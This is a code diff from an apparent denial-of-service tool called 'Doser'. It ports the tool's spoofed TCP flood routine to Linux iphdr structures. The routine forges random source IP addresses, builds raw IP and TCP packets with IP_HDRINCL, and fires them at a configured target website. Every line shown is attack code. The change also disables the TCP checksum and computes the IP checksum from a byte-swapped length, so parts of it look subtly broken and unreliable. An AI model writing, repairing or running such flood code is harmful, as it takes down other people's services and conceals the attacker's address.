@@ -454,7 +454,7 @@ void Doser::spoofed_tcp_flood(const int *id) {
     int s, on = 1, x;
     std::string message{};
     char buf[8192];
-    auto *ip = (struct ip *)buf;
+    auto *ip = (struct iphdr *)buf;
     auto *tcp = (struct tcphdr *)(ip + 1);
     struct hostent *hp;
     struct sockaddr_in dst{};
@@ -473,30 +473,30 @@ void Doser::spoofed_tcp_flood(const int *id) {
             }
 
             if((hp = gethostbyname(conf->website.c_str())) == nullptr){
-                if((ip->ip_dst.s_addr = inet_addr(conf->website.c_str())) < 0){
+                if((ip->daddr = inet_addr(conf->website.c_str())) < 0){
                     logger->Log("Can't resolve the host", Logger::Error);
                     exit(EXIT_FAILURE);
                 }
             }else{
-                bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, static_cast<size_t>(hp->h_length));
+                bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
             }
-            if((ip->ip_src.s_addr = inet_addr(randomizeIP())) < 0){
+            if((ip->saddr = inet_addr(randomizeIP())) < 0){
                 logger->Log("Unable to set random src ip", Logger::Error);
                 exit(EXIT_FAILURE);
             }
 
             // IP Struct
-            ip->ip_hl = 5;
-            ip->ip_v = 4;
-            ip->ip_tos = 16;
-            ip->ip_len = htons(sizeof(buf));
-            ip->ip_id = static_cast<u_short>(randomInt(1, 1000));
-            ip->ip_off = htons(0x0);
-            ip->ip_ttl = 64;
-            ip->ip_p = 6;
-            ip->ip_sum = 0;
+            ip->ihl = 5;
+            ip->version = 4;
+            ip->tos = 16;
+            ip->tot_len = htons(sizeof(buf));
+            ip->id = static_cast<u_short>(randomInt(1, 1000));
+            ip->frag_off = htons(0x0);
+            ip->ttl = 64;
+            ip->protocol = 6;
+            ip->check = 0;
 
-            dst.sin_addr = ip->ip_dst;
+            dst.sin_addr.s_addr = ip->daddr;
             dst.sin_family = AF_UNSPEC;
 
             // TCP Struct
@@ -510,13 +510,14 @@ void Doser::spoofed_tcp_flood(const int *id) {
             tcp->window = htons(32767);
             tcp->check = 0;
             tcp->urg_ptr = 0;
-            tcp->check = htons(checksum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct tcphdr))));
+            tcp->check = 0;//htons(checksum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct tcphdr))));
+            ip->check = checksum((unsigned short *)buf, ip->tot_len >> 1);
             if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
                 logger->Log("setsockopt() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
 
-            if(sendto(s, buf, ip->ip_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)) < 0){
+            if(sendto(s, buf, ip->tot_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)) < 0){
                 logger->Log("sendto() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
